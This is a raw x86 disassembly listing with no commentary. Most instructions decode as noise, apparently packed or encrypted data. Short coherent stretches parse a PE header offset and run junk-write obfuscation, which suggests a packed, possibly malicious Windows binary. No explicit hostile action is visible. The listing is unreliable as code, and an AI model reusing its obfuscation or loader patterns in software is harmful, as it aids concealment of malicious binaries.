  40ff4e:	fistp  DWORD PTR [ebp+0x2f]
  40ff51:	fld    DWORD PTR [ebp-0x7d]
  40ff54:	lahf   
  40ff55:	sahf   
  40ff56:	in     eax,0xf0
  40ff58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff59:	mov    bl,0x72
  40ff5b:	shl    edx,1
  40ff5d:	or     eax,0x6db14f14
  40ff62:	inc    edi
  40ff63:	pop    ds
  40ff64:	dec    edi
  40ff65:	rcl    BYTE PTR [eax-0x5b],0xb0
  40ff69:	inc    esi
  40ff6a:	add    edi,0x8531fc45
  40ff70:	pushf  
  40ff71:	clc    
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e1b4,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e777,0x42fdfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fd51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fdf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e77b
  40ffb0:	mov    DWORD PTR ds:0x42fdf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e783,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	arpl   WORD PTR [edx],si
  40ffde:	cmp    ebp,ecx
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x410059
  40ffe9:	fiadd  DWORD PTR [edi+0x24]
  40ffec:	and    BYTE PTR ds:0x5f4da64a,ah
  40fff2:	pusha  
  40fff3:	cmp    bh,BYTE PTR [edx]
  40fff5:	ja     0x41000a
  40fff7:	nop
  40fff8:	fcom   st(6)
  40fffa:	dec    eax
  40fffb:	ins    DWORD PTR es:[edi],dx
  40fffc:	mov    cl,0xc4
  40fffe:	mov    ah,0x94
  410000:	xor    DWORD PTR [esp+edx*1+0x17],esi
  410004:	pushf  
  410005:	pop    ss
  410006:	test   DWORD PTR [esi+0x1388cccb],esp
  41000c:	pushf  
  41000d:	frstor [edx]
  41000f:	sbb    al,BYTE PTR [ecx]
  410011:	add    esp,DWORD PTR [esi-0x5c2fd576]
  410017:	dec    eax
  410018:	cli    
  410019:	shl    DWORD PTR [ebx-0x3d],0xc0
  41001d:	add    edx,DWORD PTR [edx+0xa]
  410020:	sar    bh,cl
  410022:	lahf   
  410023:	repnz fdiv st(2),st
  410026:	mov    cl,0xf7
  410028:	scas   al,BYTE PTR es:[edi]
  410029:	inc    edi
  41002a:	(bad)  
  41002b:	out    0xba,al
  41002d:	mov    al,ds:0x528cadb8
  410032:	sbb    eax,0x6441706d
  410037:	push   ebp
  410038:	in     ax,dx
  41003a:	test   eax,0x9f53b79d
  41003f:	into   
  410040:	jno    0x4100b5
  410042:	adc    eax,0xe70bd851
  410047:	mov    ds:0x2170eefe,al
  41004c:	push   ss
  41004d:	daa    
  41004e:	mov    ds:0x1b45c8c0,al
  410053:	out    dx,eax
  410054:	push   cs
  410055:	imul   esp,DWORD PTR [eax-0x34],0x71e9a720
  41005c:	mov    ecx,0xa1b72784
  410061:	mov    dh,ah
  410063:	push   edi
  410064:	retf   
  410065:	iret   
  410066:	aas    
  410067:	test   eax,0x2d608cfb
  41006c:	xor    eax,0xc93f1c7
  410071:	mov    ah,0x75
  410073:	fnsave [esi+0x8]
  410076:	jnp    0x410099
  410078:	retf   0x2055
  41007b:	adc    DWORD PTR [esi-0x500698ca],0xffffffff
  410082:	lahf   
  410083:	les    esi,FWORD PTR [ecx-0x38]
  410086:	jge    0x41009c
  410088:	inc    esi
  410089:	push   ebp
  41008a:	jle    0x41008d
  41008c:	and    DWORD PTR [edx],edx
  41008e:	push   esi
  41008f:	fistp  WORD PTR [ebx]
  410091:	xchg   edx,eax
  410092:	int3   
  410093:	xlat   BYTE PTR ds:[ebx]
  410094:	retf   0x5f4
  410097:	mov    ds:0x76f6f2f4,al
  41009c:	push   ebp
  41009d:	fstp   QWORD PTR [eax+eax*4-0x57f94a41]
  4100a4:	dec    edi
  4100a5:	in     al,dx
  4100a6:	add    al,0xfa
  4100a8:	cwde   
  4100a9:	out    0x57,eax
  4100ab:	mov    dl,0x2
  4100ad:	push   DWORD PTR [edx]
  4100af:	fadd   DWORD PTR [ebx+eiz*1]
  4100b2:	jo     0x41006c
  4100b4:	loop   0x41007c
  4100b6:	aas    
  4100b7:	xor    al,0x1f
  4100b9:	add    ah,dh
  4100bb:	xchg   edx,eax
  4100bc:	add    eax,ebx
  4100be:	push   ss
  4100bf:	stos   DWORD PTR es:[edi],eax
  4100c0:	cmp    ebx,eax
  4100c2:	(bad)  
  4100c4:	in     eax,0x8b
  4100c6:	sahf   
  4100c7:	dec    esi
  4100c8:	cmp    al,0xbe
  4100ca:	dec    ecx
  4100cb:	loopne 0x4100cd
  4100cd:	popa   
  4100ce:	lods   al,BYTE PTR ds:[esi]
  4100cf:	add    BYTE PTR [edx+edx*1-0x1],bl
  4100d3:	adc    bh,BYTE PTR [eax]
  4100d5:	jle    0x4100d5
  4100d7:	jne    0x41010b
  4100d9:	cmp    eax,0x2d9446da
  4100de:	dec    esi
  4100df:	aaa    
  4100e0:	pop    ebp
  4100e1:	in     eax,0xc8
  4100e3:	sbb    DWORD PTR [eax],edx
  4100e5:	mov    al,ds:0x34c55ea5
  4100ea:	cwde   
  4100eb:	fsqrt  
  4100ed:	inc    edi
  4100ee:	dec    ecx
  4100ef:	mov    eax,ds:0xcd01bf9e
  4100f4:	jnp    0x41011d
  4100f6:	sub    ecx,edi
  4100f8:	or     BYTE PTR [edi+0x161d6f1e],dh
  4100fe:	ret    0x2eb4
  410101:	int    0x2b
  410103:	mov    DWORD PTR [esi+eax*2+0x4197e3cf],edx
  41010a:	jmp    0x5e39:0xc41979e7
  410111:	bound  eax,QWORD PTR [ebx]
  410113:	call   0xc7dfd177
  410118:	gs test eax,0xd0221357
  41011e:	mov    esp,0x4df9e3ee
  410123:	pushf  
  410124:	les    ebx,FWORD PTR [eax]
  410126:	mov    ch,0x7d
  410128:	dec    ecx
  410129:	pop    ds
  41012a:	test   al,0x75
  41012c:	or     al,0x9
  41012e:	lock push ebp
  410130:	fmul   st(2),st
  410132:	retf   
  410133:	push   esp
  410134:	jmp    0x159e8b14
  410139:	aas    
  41013a:	jecxz  0x41010a
  41013c:	inc    ebp
  41013d:	dec    edi
  41013e:	call   0x4a5a:0xc3f44d72
  410145:	xchg   edx,eax
  410146:	cmp    BYTE PTR [edx+0x50e36b47],bl
  41014c:	loopne 0x410125
  41014e:	int    0x4f
  410150:	sbb    al,0x2
  410152:	addr16 sub al,dh
  410155:	pop    ds
  410156:	xor    DWORD PTR [bx-0x52],eax
  41015a:	jge    0x4100ff
  41015c:	pop    es
  41015d:	(bad)  
  41015e:	clc    
  41015f:	sbb    al,0x20
  410161:	pop    eax
  410162:	xor    DWORD PTR [eax+0x7a08adbe],edx
  410168:	inc    ebx
  410169:	stos   BYTE PTR es:[edi],al
  41016a:	test   eax,0x2984376d
  41016f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410170:	and    BYTE PTR [ebx-0x66],ah
  410173:	jge    0x4101dc
  410175:	arpl   WORD PTR [edx-0x73],cx
  410178:	lahf   
  410179:	sbb    DWORD PTR [ecx+0x3681c130],0x1f
  410180:	(bad)  
  410181:	mov    al,0x88
  410183:	pop    ebx
  410184:	leave  
  410185:	pop    ebx
  410186:	scas   eax,DWORD PTR es:[edi]
  410187:	jmp    0xa53c:0x97c7a6e6
  41018e:	or     al,0x98
  410190:	hlt    
  410191:	dec    ebp
  410192:	jne    0x410150
  410194:	leave  
  410195:	or     esi,DWORD PTR [ebx]
  410197:	ins    DWORD PTR es:[edi],dx
  410198:	sub    edi,DWORD PTR [edx-0x23660361]
  41019e:	aam    0x4c
  4101a0:	stos   DWORD PTR es:[edi],eax
  4101a1:	(bad)  
  4101a2:	pop    esi
  4101a3:	ret    
  4101a4:	adc    ecx,eax
  4101a6:	and    al,0xd2
  4101a8:	xor    cl,bl
  4101aa:	xchg   ebx,eax
  4101ab:	in     al,dx
  4101ac:	bound  edi,QWORD PTR [edx+0x5c18ae8b]
  4101b2:	mov    dh,BYTE PTR [edx-0x77407216]
  4101b8:	sbb    dl,bh
  4101ba:	or     ah,dl
  4101bc:	mov    ds:0x99b20d7,al
  4101c1:	lea    ebp,[edx+edi*1+0x24b64ddf]
  4101c8:	cli    
  4101c9:	jo     0x4101b1
  4101cb:	stc    
  4101cc:	adc    esp,ebp
  4101ce:	xchg   edx,eax
  4101cf:	cmp    ecx,esp
  4101d1:	mov    cx,0xd316
  4101d5:	pop    ebp
  4101d6:	lods   al,BYTE PTR ds:[esi]
  4101d7:	iret   
  4101d8:	sub    BYTE PTR ds:0x2fdbbd4,cl
  4101de:	out    dx,al
  4101df:	ins    DWORD PTR es:[edi],dx
  4101e0:	dec    eax
  4101e1:	mov    ecx,0x429de836
  4101e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e7:	imul   DWORD PTR [esi-0x549fb115]
  4101ed:	push   0x5585d170
  4101f2:	(bad)  
  4101f3:	dec    ebp
  4101f4:	cpuid  
  4101f6:	push   esi
  4101f7:	sbb    eax,0xf45af7f4
  4101fc:	sahf   
  4101fd:	jmp    0x4101ee
  4101ff:	lahf   
  410200:	stos   DWORD PTR es:[edi],eax
  410201:	mov    bl,0x54
  410203:	ds inc edi
  410205:	push   ebp
  410206:	shr    BYTE PTR [ecx+0x21],1
  410209:	retf   
  41020a:	sub    BYTE PTR [ebp+0x5c892c5],ah
  410210:	xor    al,0xf9
  410212:	ret    0x186e
  410215:	sbb    eax,DWORD PTR [edx-0x6d]
  410218:	sar    DWORD PTR [esi-0x54ebdcff],cl
  41021e:	and    bh,dh
  410220:	mov    ds:0xdb3cc59b,eax
  410225:	mov    ch,0xfb
  410227:	xor    eax,0x58cfd697
  41022c:	dec    esp
  41022d:	out    dx,al
  41022e:	push   0x70116611
  410233:	repz or ebp,DWORD PTR [esp+ebp*4-0x2f]
  410238:	retf   
  410239:	ins    BYTE PTR es:[edi],dx
  41023a:	fs pop ebp
  41023c:	lods   eax,DWORD PTR ds:[esi]
  41023d:	mov    ecx,0x921e0842
  410242:	cli    
  410243:	scas   eax,DWORD PTR es:[edi]
  410244:	mov    bl,0x13
  410246:	fnstenv [edi+0x473fa66f]
  41024c:	xor    DWORD PTR [ecx],edi
  41024e:	or     al,0x18
  410250:	shl    BYTE PTR [ecx+0x44b13bf1],1
  410256:	xor    al,0x4b
  410258:	hlt    
  410259:	mov    dh,0x39
  41025b:	inc    edi
  41025c:	jmp    0xacc1c22f
  410261:	xor    DWORD PTR [esi+0x23],eax
  410264:	out    0x73,al
  410266:	xchg   DWORD PTR [edx+0x1e],ebp
  410269:	push   esp
  41026a:	jno    0x4102b4
  41026c:	repz jae 0x41023a
  41026f:	inc    esp
  410270:	xor    DWORD PTR [ebx+0x3b],esi
  410273:	je     0x410274
  410275:	mov    esp,0x3470c16d
  41027a:	jmp    0x163e9b1a
  41027f:	(bad)  
  410280:	mov    WORD PTR [ebp-0x28],gs
  410283:	mov    ds:0x6b3eac91,al
  410288:	enter  0x6056,0xe9
  41028c:	pop    edi
  41028d:	adc    DWORD PTR [esp+esi*8],edi
  410290:	mov    WORD PTR [ecx-0x6a63ad5e],?
  410296:	jge    0x41025d
  410298:	xor    eax,DWORD PTR [ebp+0x470dc72d]
  41029e:	push   ebx
  41029f:	mov    dh,0x37
  4102a1:	arpl   WORD PTR [edx+0x3],bp
  4102a4:	jg     0x410294
  4102a6:	int    0x2d
  4102a8:	mov    esi,0xff84cbb
  4102ad:	fild   WORD PTR [ebp+ecx*2-0x70]
  4102b1:	jle    0x41029a
  4102b3:	in     eax,0x0
  4102b5:	lods   eax,DWORD PTR ds:[esi]
  4102b6:	popa   
  4102b7:	pushf  
  4102b8:	cmp    ecx,esi
  4102ba:	pop    es
  4102bb:	bnd call 0x2a7e6b95
  4102c1:	data16 or al,0xfe
  4102c4:	cld    
  4102c5:	loope  0x4102ed
  4102c7:	dec    eax
  4102c8:	mov    DWORD PTR [esi+0x15098c6],esp
  4102ce:	dec    ecx
  4102cf:	dec    esp
  4102d0:	into   
  4102d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102d2:	ss sub al,0xd8
  4102d5:	cli    
  4102d6:	or     al,0x4d
  4102d8:	xor    eax,0x40c6d154
  4102dd:	cmp    eax,0xde5bd60f
  4102e2:	rcl    cl,1
  4102e4:	add    al,0xcd
  4102e6:	fisttp QWORD PTR [ecx+edi*2+0x7b]
  4102ea:	jb     0x410312
  4102ec:	xor    al,0x50
  4102ee:	mov    bl,0x36
  4102f0:	cdq    
  4102f1:	mov    eax,ds:0xc2420e2e
  4102f6:	(bad)  
  4102f7:	fldcw  WORD PTR [eax]
  4102f9:	pop    ds
  4102fa:	pop    ss
  4102fb:	mov    eax,ds:0xbab6f0de
  410300:	mov    eax,0x409dad6
  410305:	add    al,dh
  410307:	sub    BYTE PTR [ebx+0x42],dh
  41030a:	cmc    
  41030b:	pop    ds
  41030c:	data16 adc al,0x3e
  41030f:	push   eax
  410310:	pop    ss
  410311:	mov    al,ah
  410313:	nop
  410314:	pop    edx
  410315:	sti    
  410316:	stc    
  410317:	call   0x9098:0xe0ab39f6
  41031e:	adc    ecx,DWORD PTR [ebp+0x53a85d6]
  410324:	jmp    0x1b17:0xeb131831
  41032b:	cmc    
  41032c:	int    0x75
  41032e:	mov    BYTE PTR [eax+eax*4],ah
  410331:	cmp    edx,ebx
  410333:	pop    ebp
  410334:	test   DWORD PTR [ebx-0x12ee15d7],edi
  41033a:	test   al,0x7c
  41033c:	inc    esi
  41033d:	jg     0x4103a3
  41033f:	push   ecx
  410340:	sub    ch,dl
  410342:	(bad)  
  410343:	into   
  410344:	mov    cl,0x71
  410346:	rcl    BYTE PTR [eax+0x32],1
  410349:	mov    esi,0x3646d8bc
  41034e:	(bad)  
  41034f:	mov    ds:0x9b18b861,eax
  410354:	scas   eax,DWORD PTR es:[edi]
  410355:	fwait
  410356:	mov    ds:0xc22cd1a6,eax
  41035b:	enter  0x6e72,0x55
  41035f:	xchg   BYTE PTR ds:0x4781c412,al
  410365:	pop    eax
  410366:	dec    edi
  410367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410368:	mov    bh,0x2f
  41036a:	(bad)  
  41036b:	hlt    
  41036c:	inc    ecx
  41036d:	dec    ecx
  41036e:	out    dx,al
  41036f:	or     DWORD PTR [edx],0x38
  410372:	stc    
  410373:	inc    ebp
  410374:	sbb    ebx,DWORD PTR [esi-0x5f839b69]
  41037a:	mov    ch,0x3d
  41037c:	mov    ebx,ecx
  41037e:	xchg   ebp,eax
  41037f:	adc    al,0x96
  410381:	cmc    
  410382:	and    al,BYTE PTR [ebx-0x29fc628b]
  410388:	inc    ecx
  410389:	pop    eax
  41038a:	fld    DWORD PTR [eax+0x6f]
  41038d:	sbb    al,0xf4
  41038f:	loope  0x41040b
  410391:	daa    
  410392:	idiv   BYTE PTR [edi+ebx*1-0x77]
  410396:	dec    ebp
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd85
  4103a6:	add    ecx,DWORD PTR ds:0x42fd89
  4103ac:	mov    DWORD PTR ds:0x42fd85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e19c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x5053:0x14b0bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	clc    
  4103db:	xchg   esi,eax
  4103dc:	and    eax,0x60c68212
  4103e1:	loop   0x41039e
  4103e3:	mov    eax,ds:0xdf4623e8
  4103e8:	ds cli 
  4103ea:	(bad)  
  4103ec:	into   
  4103ed:	xchg   ch,al
  4103ef:	mov    esp,0x431da8c8
  4103f4:	outs   dx,DWORD PTR ds:[esi]
  4103f5:	repnz xor ecx,DWORD PTR [ebx+0x2b4b97d1]
  4103fc:	retf   0x33c4
  4103ff:	push   edx
  410400:	sbb    al,BYTE PTR [eax+0x38be9c20]
  410406:	cmp    ebp,eax
  410408:	push   edi
  410409:	push   esi
  41040a:	cmc    
  41040b:	iret   
  41040c:	dec    edi
  41040d:	(bad)  
  410410:	stc    
  410411:	jg     0x4103da
  410413:	push   ebp
  410414:	icebp  
  410415:	dec    esi
  410416:	jmp    0x4103b2
  410418:	ffree  st(3)
  41041a:	mov    edi,0xf82241e6
  41041f:	je     0x41041b
  410421:	cmp    ah,BYTE PTR [ebp-0x2f5c263c]
  410427:	mov    al,0x44
  410429:	cdq    
  41042a:	mov    ds:0x60bc6d3f,al
  41042f:	push   ss
  410430:	fistp  WORD PTR [ebp+0x7a]
  410433:	jle    0x410446
  410435:	xchg   DWORD PTR [edx-0x10],ebx
  410438:	dec    ebp
  410439:	cmp    ebp,edi
  41043b:	and    eax,0xa60ce420
  410440:	adc    al,BYTE PTR [edi+0x61]
  410443:	(bad)  
  410445:	fadd   DWORD PTR [ebx+0xd]
  410448:	shr    DWORD PTR [ecx-0x181467cf],1
  41044e:	xchg   esi,eax
  41044f:	cmp    edx,esp
  410451:	in     eax,0x88
  410453:	xchg   edx,eax
  410454:	test   ebp,ebp
  410456:	daa    
  410457:	and    DWORD PTR [edi+0x77fbce38],edi
  41045d:	lock ins DWORD PTR es:[edi],dx
  41045f:	push   edx
  410460:	sbb    ebp,DWORD PTR [ebx]
  410462:	mov    ah,0x3f
  410464:	pop    ebx
  410465:	lock push 0xc7ea61ea
  41046b:	ss pop ds
  41046d:	jle    0x410409
  41046f:	inc    ebx
  410470:	jns    0x41042f
  410472:	adc    al,0xa2
  410474:	xchg   ebp,eax
  410475:	shl    DWORD PTR [eax],cl
  410477:	popf   
  410478:	inc    ebp
  410479:	shr    DWORD PTR [edx+ebp*1],1
  41047c:	mov    ch,ah
  41047e:	je     0x4104ba
  410480:	and    eax,0x426c8c08
  410485:	test   BYTE PTR [ecx],ch
  410487:	sub    al,BYTE PTR [eax]
  410489:	outs   dx,DWORD PTR ds:[esi]
  41048a:	ja     0x4104a0
  41048c:	mov    ah,0x81
  41048e:	or     BYTE PTR [esi+0x698a7d6],dl
  410494:	cmc    
  410495:	pop    es
  410496:	add    eax,0x84db6ae9
  41049b:	loopne 0x41048c
  41049d:	pushf  
  41049e:	fiadd  DWORD PTR [ebp+0x1]
  4104a1:	fmul   st,st(5)
  4104a3:	(bad)  
  4104a4:	mov    eax,ds:0xa89a2d13
  4104a9:	fisub  WORD PTR [edx+0x2]
  4104ac:	xchg   edx,eax
  4104ad:	fsubr  st(7),st
  4104af:	ins    DWORD PTR es:[edi],dx
  4104b0:	icebp  
  4104b1:	sbb    edi,esp
  4104b3:	pushf  
  4104b4:	repnz or ecx,edi
  4104b7:	adc    bl,BYTE PTR [eax+0x310d952d]
  4104bd:	in     eax,dx
  4104be:	and    DWORD PTR [ebp+ebx*2-0x40],esi
  4104c2:	dec    ebp
  4104c3:	xchg   ebp,eax
  4104c4:	push   ebp
  4104c5:	(bad)  
  4104c6:	xchg   edx,eax
  4104c7:	sub    ah,BYTE PTR [esi+0x2582df79]
  4104cd:	push   esp
  4104ce:	jb     0x41052e
  4104d0:	jae    0x410549
  4104d2:	ins    BYTE PTR es:[edi],dx
  4104d3:	imul   edx,ebp,0xf284c3a5
  4104d9:	popf   
  4104da:	outs   dx,BYTE PTR ds:[esi]
  4104db:	loopne 0x4104b1
  4104dd:	jg     0x41048b
  4104df:	je     0x410504
  4104e1:	mov    BYTE PTR [ebx-0xc24792d],bh
  4104e7:	xchg   edx,eax
  4104e8:	loop   0x41051d
  4104ea:	adc    ebx,DWORD PTR [ebp-0x1c]
  4104ed:	jge    0x4104f4
  4104ef:	je     0x4104a1
  4104f1:	push   edx
  4104f2:	das    
  4104f3:	test   eax,0x4e21ea08
  4104f8:	jo     0x4104c2
  4104fa:	pop    esi
  4104fb:	pop    edi
  4104fc:	sbb    DWORD PTR [edx-0x2d],0xffffff8c
  410500:	mov    dh,0xb3
  410502:	jns    0x4104ea
  410504:	jmp    0x13943d77
  410509:	pop    edi
  41050a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41050b:	outs   dx,DWORD PTR ds:[esi]
  41050c:	scas   eax,DWORD PTR es:[edi]
  41050d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41050e:	sub    esi,DWORD PTR [eax+0x49df0a50]
  410514:	mov    ds:0x4a808b0b,eax
  410519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41051a:	cmp    edx,edx
  41051c:	pop    ds
  41051d:	sbb    esp,DWORD PTR [edi-0x460369ce]
  410523:	or     DWORD PTR [ecx+0x21],0xffffff98
  410527:	loopne 0x410523
  410529:	mov    ebx,0xe9f7d7b1
  41052e:	aaa    
  41052f:	mov    al,ds:0x73247f51
  410534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410535:	repnz xor al,0x9c
  410538:	popa   
  410539:	retf   0xc58d
  41053c:	jbe    0x410513
  41053e:	scas   eax,DWORD PTR es:[edi]
  41053f:	jp     0x4105b7
  410541:	and    DWORD PTR [esi+0x23121740],ebp
  410547:	mov    eax,0xcb186cb0
  41054c:	mov    al,0xce
  41054e:	iret   
  41054f:	pop    ds
  410550:	dec    esi
  410551:	mov    bh,0x3b
  410553:	popa   
  410554:	lea    esi,[ecx+0x36170eda]
  41055a:	add    al,0x58
  41055c:	pop    edx
  41055d:	not    BYTE PTR [ebp+0x5f5bcda9]
  410563:	sub    DWORD PTR [edx-0xc],ecx
  410566:	jmp    0x42b4:0xf0d2b9b7
  41056d:	shl    BYTE PTR [ecx+0x74],cl
  410570:	push   ebp
  410571:	(bad)  
  410572:	push   esp
  410573:	stos   BYTE PTR es:[edi],al
  410574:	sub    ah,ah
  410576:	(bad)  
  410578:	nop
  410579:	and    eax,0x31018bf2
  41057e:	sbb    eax,0xb4f6c90
  410583:	push   ss
  410584:	aas    
  410585:	stos   DWORD PTR es:[edi],eax
  410586:	cmovge esi,DWORD PTR [ebx+0x68]
  41058a:	fstp   QWORD PTR [esi]
  41058c:	push   edx
  41058d:	adc    al,0xb8
  41058f:	push   esp
  410590:	(bad)  
  410591:	js     0x410569
  410593:	pushf  
  410594:	inc    ebx
  410595:	lock jmp 0xa27a:0x8e414bb4
  41059d:	sbb    ebx,DWORD PTR [edx*1+0x12f31680]
  4105a4:	loope  0x41055b
  4105a6:	xchg   ebp,eax
  4105a7:	int    0x36
  4105a9:	jmp    0x410580
  4105ab:	out    0x7c,eax
  4105ad:	jecxz  0x41062a
  4105af:	fwait
  4105b0:	xchg   ecx,eax
  4105b1:	mov    ebx,0xfbb7e782
  4105b6:	pusha  
  4105b7:	or     eax,0xcbf33af
  4105bc:	cmc    
  4105bd:	or     DWORD PTR [esi],ebx
  4105bf:	jne    0x4105a8
  4105c1:	cs dec ebp
  4105c3:	mov    WORD PTR [ebp+edx*2-0x41],fs
  4105c7:	sbb    BYTE PTR [ebx],ah
  4105c9:	out    0x73,al
  4105cb:	test   al,0xb3
  4105cd:	cli    
  4105ce:	jmp    0xf2b4f166
  4105d3:	mov    cl,BYTE PTR [eax-0x6fccd8df]
  4105d9:	or     edx,ecx
  4105db:	mov    cl,0xa8
  4105dd:	push   esi
  4105de:	add    edx,DWORD PTR [ebp-0x5def8d79]
  4105e4:	xchg   edx,eax
  4105e5:	jle    0x4105ca
  4105e7:	pop    ebx
  4105e8:	sbb    eax,0x7b74ff96
  4105ed:	stos   DWORD PTR es:[edi],eax
  4105ee:	into   
  4105ef:	daa    
  4105f0:	inc    esi
  4105f1:	mov    ds:0xd671ac59,al
  4105f6:	mov    eax,ds:0x1deba740
  4105fb:	sub    DWORD PTR [ecx+0x5a],edi
  4105fe:	xor    al,0xa2
  410600:	adc    ebp,DWORD PTR [esp+esi*4-0x12]
  410604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410605:	jae    0x4105ef
  410607:	and    BYTE PTR ss:[ebx],dl
  41060a:	jbe    0x41067e
  41060c:	xchg   esp,eax
  41060d:	dec    esp
  41060e:	call   0xc005:0xdde05623
  410615:	push   esi
  410616:	sbb    dl,BYTE PTR [esi]
  410618:	cmp    BYTE PTR [ecx+eiz*1+0x34c8ccf4],bh
  41061f:	les    ebp,FWORD PTR [ebx+0x52]
  410622:	mov    cl,0x50
  410624:	call   0x641d0866
  410629:	(bad)  
  41062b:	std    
  41062c:	jp     0x4106a6
  41062e:	out    0xf7,al
  410630:	arpl   cx,si
  410632:	dec    ebp
  410633:	pushf  
  410634:	adc    esp,edi
  410636:	jle    0x410644
  410638:	sub    al,0x56
  41063a:	push   0x331452b7
  41063f:	int    0xe
  410641:	test   DWORD PTR [ebx+0x75],eax
  410644:	jge    0x410658
  410646:	xchg   ecx,eax
  410647:	jae    0x4106be
  410649:	fild   DWORD PTR [ebx+0x40]
  41064c:	not    BYTE PTR [esp+edi*4]
  41064f:	fcmovne st,st(7)
  410651:	xchg   ebp,eax
  410652:	daa    
  410653:	into   
  410654:	and    DWORD PTR [ebp+0x6e],ecx
  410657:	retf   
  410658:	pop    esi
  410659:	mov    edx,DWORD PTR [esi+eiz*8-0xb]
  41065d:	push   ds
  41065e:	lea    esp,[eax]
  410660:	mov    ds:0x7ba8ad3e,al
  410665:	pop    ecx
  410666:	inc    edx
  410667:	pop    es
  410668:	push   eax
  410669:	pop    DWORD PTR [ebx]
  41066b:	mov    ah,ah
  41066d:	cmp    BYTE PTR [eax+0x4047c6b1],dh
  410673:	clc    
  410674:	out    dx,eax
  410675:	xor    al,BYTE PTR [edi+0xc]
  410678:	ror    dh,1
  41067a:	mov    esp,0xbc3df07f
  41067f:	not    al
  410681:	rcr    BYTE PTR [edx+ecx*1-0x73ff5ea6],cl
  410688:	dec    edi
  410689:	or     BYTE PTR [edx-0x74],dl
  41068c:	push   ss
  41068d:	push   ecx
  41068e:	enter  0xc440,0xf2
  410692:	xchg   esi,eax
  410693:	lahf   
  410694:	cmp    DWORD PTR [ecx+ebx*4-0x10],eax
  410698:	mov    esi,0x1c486a31
  41069d:	cmp    edi,esi
  41069f:	test   eax,0x7f327dd5
  4106a4:	mov    al,0xbf
  4106a6:	mov    ebp,0x40e7658d
  4106ab:	std    
  4106ac:	mov    dl,0xae
  4106ae:	lahf   
  4106af:	je     0x410726
  4106b1:	jns    0x410664
  4106b3:	pop    esp
  4106b4:	fidiv  DWORD PTR [edi+0x5c]
  4106b7:	mov    BYTE PTR [edi-0x1e08421e],cl
  4106bd:	lods   al,BYTE PTR ds:[esi]
  4106be:	(bad)  
  4106bf:	pop    ebx
  4106c0:	or     ebp,DWORD PTR ds:0xea63caab
  4106c6:	aas    
  4106c7:	xchg   edx,eax
  4106c8:	cs std 
  4106ca:	aam    0xc0
  4106cc:	aam    0x27
  4106ce:	into   
  4106cf:	into   
  4106d0:	fstp   DWORD PTR [ecx+ebp*4-0x17]
  4106d4:	cs pop ecx
  4106d6:	inc    esi
  4106d7:	sub    eax,0x93bd9991
  4106dc:	je     0x4106f0
  4106de:	or     DWORD PTR [edx+0x56f7bee],eax
  4106e4:	icebp  
  4106e5:	(bad)  
  4106e6:	aas    
  4106e7:	arpl   cx,dx
  4106e9:	test   DWORD PTR [esp+ebp*4],esi
  4106ec:	jae    0x41074c
  4106ee:	(bad)  
  4106ef:	xchg   ecx,eax
  4106f0:	pop    ss
  4106f1:	dec    eax
  4106f2:	outs   dx,BYTE PTR ds:[esi]
  4106f3:	push   ecx
  4106f4:	mov    ?,WORD PTR [ebx-0x77]
  4106f7:	in     al,0x63
  4106f9:	daa    
  4106fa:	dec    edx
  4106fb:	jo     0x4106d4
  4106fd:	imul   DWORD PTR [edx-0x6b]
  410700:	imul   esp,DWORD PTR [ebp+0x2a],0x81caddfd
  410707:	test   DWORD PTR [edx],ebp
  410709:	xchg   esi,eax
  41070a:	push   0x735929d
  41070f:	and    al,0xff
  410711:	jne    0x410714
  410713:	iret   
  410714:	inc    eax
  410715:	in     al,dx
  410716:	pop    edx
  410717:	pop    ds
  410718:	mov    al,0x1a
  41071a:	xor    eax,0xd2aefc61
  41071f:	retf   
  410720:	call   ecx
  410722:	mov    ebp,0xbd128b05
  410727:	mov    dh,0x20
  410729:	push   edx
  41072a:	out    dx,eax
  41072b:	dec    edi
  41072c:	into   
  41072d:	mov    cl,BYTE PTR [ebx-0x10d8c223]
  410733:	mov    bh,0xc2
  410735:	gs je  0x41078e
  410738:	ss loope 0x410731
  41073b:	mov    ebx,fs
  41073d:	jmp    0xe804:0xc7f5dacc
  410744:	sbb    ah,BYTE PTR [esi-0x28f6abcf]
  41074a:	mov    eax,0x2bb1193e
  41074f:	pusha  
  410750:	lahf   
  410751:	(bad)  
  410752:	cwde   
